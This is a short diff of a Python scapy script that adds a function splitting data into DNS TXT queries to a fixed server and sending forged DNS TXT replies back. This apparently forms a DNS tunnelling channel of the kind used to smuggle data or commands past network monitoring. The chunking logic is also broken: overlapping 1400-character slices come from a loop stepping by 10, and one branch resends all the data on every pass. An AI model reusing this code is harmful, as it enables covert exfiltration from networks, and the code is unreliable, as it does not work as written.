@@ -35,6 +35,24 @@ def signal_handler(sig, frame):
 def sniff_pkt(pfilter,handler,cnt=30,timer=1000):
     capture = sniff(filter=pfilter,count=cnt,prn=handler,timeout=timer)
     
-
+def frag_and_send(packet,data,is_client,is_output,pref):
+    for chunk in range(0, len(data), 10):
+        x = chunk
+        if is_output == 1:
+            content = IN_TRANSFER
+            content+=data[x:x+1400]
+        elif is_output == 0:
+            content = pref
+            content+=data
+        if is_client == 1:
+            pkt = IP(dst=SERVER_ADR)/UDP(sport=1234)/DNS(qd=DNSQR(qtype="TXT", qname=content))
+        elif is_client == 0:
+            pkt = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport)/DNS(qd=packet[DNS].qd,rd=0,qr=1,an=DNSRR(rrname=packet[DNS].qd.qname,type='TXT',rdata=content))
+        send(pkt)
+        time.sleep(300/1000)   
+        
+def close_file(fd):
+    os.close(fd)
+            
     
     
